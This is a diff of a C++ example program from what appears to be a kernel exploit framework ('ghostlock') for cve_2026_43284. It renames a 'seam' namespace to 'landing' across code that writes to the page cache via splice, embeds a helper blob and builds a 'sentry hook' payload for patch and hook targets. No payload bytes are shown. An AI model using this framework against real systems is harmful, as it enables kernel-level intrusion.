@@ -55,14 +55,14 @@
 #include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
 #include "backend/cve_2026_43284/hook/sentry_hook.hpp"
 #include "backend/cve_2026_43284/kernel_access.hpp"
-#include "backend/cve_2026_43284/seam/crash_dump_bridge.hpp"
+#include "backend/cve_2026_43284/landing/crash_dump_bridge.hpp"
 #include "backend/cve_2026_43284/lkm/module_facts.hpp"
-#include "backend/cve_2026_43284/seam/pagecache_door_linux.hpp"
-#include "backend/cve_2026_43284/seam/pagecache_doors.hpp"
-#include "backend/cve_2026_43284/seam/pagecache_seam.hpp"
-#include "backend/cve_2026_43284/seam/pagecache_write.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_landing.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_write.hpp"
 #include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
-#include "backend/cve_2026_43284/seam/real_splice_io.hpp"
+#include "backend/cve_2026_43284/landing/real_splice_io.hpp"
 #include "backend/cve_2026_43284/session_frame.hpp"
 #include "contract/kernel_access.hpp"
 #include "support/sha256.hpp"
@@ -77,23 +77,23 @@ namespace {
     using ghostlock::backend::cve_2026_43284::lkm::read_module_facts;
     using ghostlock::backend::cve_2026_43284::lkm::vermagic_belongs_to;
     using ghostlock::backend::cve_2026_43284::lkm::vermagic_matches_kernel;
-    using ghostlock::backend::cve_2026_43284::seam::kWriteWidth;
-    using ghostlock::backend::cve_2026_43284::seam::PageCacheDoorLinux;
-    using ghostlock::backend::cve_2026_43284::seam::PageCacheSeam;
-    using ghostlock::backend::cve_2026_43284::seam::PageCacheWrite;
-    using ghostlock::backend::cve_2026_43284::seam::RealSpliceIo;
+    using ghostlock::backend::cve_2026_43284::landing::kWriteWidth;
+    using ghostlock::backend::cve_2026_43284::landing::PageCacheDoorLinux;
+    using ghostlock::backend::cve_2026_43284::landing::PageCacheLanding;
+    using ghostlock::backend::cve_2026_43284::landing::PageCacheWrite;
+    using ghostlock::backend::cve_2026_43284::landing::RealSpliceIo;
     using ghostlock::backend::cve_2026_43284::embed::splicehelper_bytes;
     using ghostlock::backend::cve_2026_43284::embed::splicehelper_padded_size;
-    using ghostlock::backend::cve_2026_43284::seam::real_splice_io;
-    using ghostlock::backend::cve_2026_43284::seam::CrashDumpBridge;
+    using ghostlock::backend::cve_2026_43284::landing::real_splice_io;
+    using ghostlock::backend::cve_2026_43284::landing::CrashDumpBridge;
     using ghostlock::backend::cve_2026_43284::hook::build_sentry_payload;
     using ghostlock::backend::cve_2026_43284::hook::device_sentry_plan;
     using ghostlock::backend::cve_2026_43284::hook::hook_branch;
     using ghostlock::backend::cve_2026_43284::hook::SentryError;
     using ghostlock::backend::cve_2026_43284::hook::SentryPlan;
-    using ghostlock::backend::cve_2026_43284::seam::DoorOps;
-    using ghostlock::backend::cve_2026_43284::seam::HelperWriteSource;
-    using ghostlock::backend::cve_2026_43284::seam::OldPageSource;
+    using ghostlock::backend::cve_2026_43284::landing::DoorOps;
+    using ghostlock::backend::cve_2026_43284::landing::HelperWriteSource;
+    using ghostlock::backend::cve_2026_43284::landing::OldPageSource;
     using ghostlock::contract::AccessChannel;
 
     /* The values 6f7ded87 used, one per line, so changing a target is changing this block. */
@@ -515,8 +515,8 @@ int main(int argc, char **argv) {
     {
         RealSpliceIo patch_surface(real_splice_io(), patch_fd);
         PageCacheWrite patch_window(patch_door, patch_surface);
-        PageCacheSeam patch_seam(patch_window);
-        Access patch_access(&patch_seam);
+        PageCacheLanding patch_landing(patch_window);
+        Access patch_access(&patch_landing);
         const auto up = patch_access.initialize(params);
         if (!up.ok()) {
             std::printf("example: initialize refused for the patch target (%s)\n",
@@ -558,7 +558,7 @@ int main(int argc, char **argv) {
                     "reads and splices it\n",
                     carrier, errno);
     }
-    seam::RemoteDoor remote_door(door);
+    landing::RemoteDoor remote_door(door);
     DoorOps &doors = (target_fd < 0) ? static_cast<DoorOps &>(remote_door)
                                      : static_cast<DoorOps &>(door);
     RealSpliceIo surface(real_splice_io(), target_fd, 0, old_page, helper);
@@ -569,8 +569,8 @@ int main(int argc, char **argv) {
         params.sequence = spent_sequence;
         params.sequence_set = true;
     }
-    PageCacheSeam seam(window);
-    Access access(&seam);
+    PageCacheLanding landing(window);
+    Access access(&landing);
     const auto up = access.initialize(params);
     if (!up.ok()) {
         std::printf("example: initialize refused (%s)\n",
@@ -612,8 +612,8 @@ int main(int argc, char **argv) {
         }
         RealSpliceIo hook_surface(real_splice_io(), hook_fd);
         PageCacheWrite hook_window(hook_door, hook_surface);
-        PageCacheSeam hook_seam(hook_window);
-        Access hook_access(&hook_seam);
+        PageCacheLanding hook_landing(hook_window);
+        Access hook_access(&hook_landing);
         const auto hook_up = hook_access.initialize(params);
         if (!hook_up.ok()) {
             std::printf("example: initialize refused for the hook target (%s)\n",
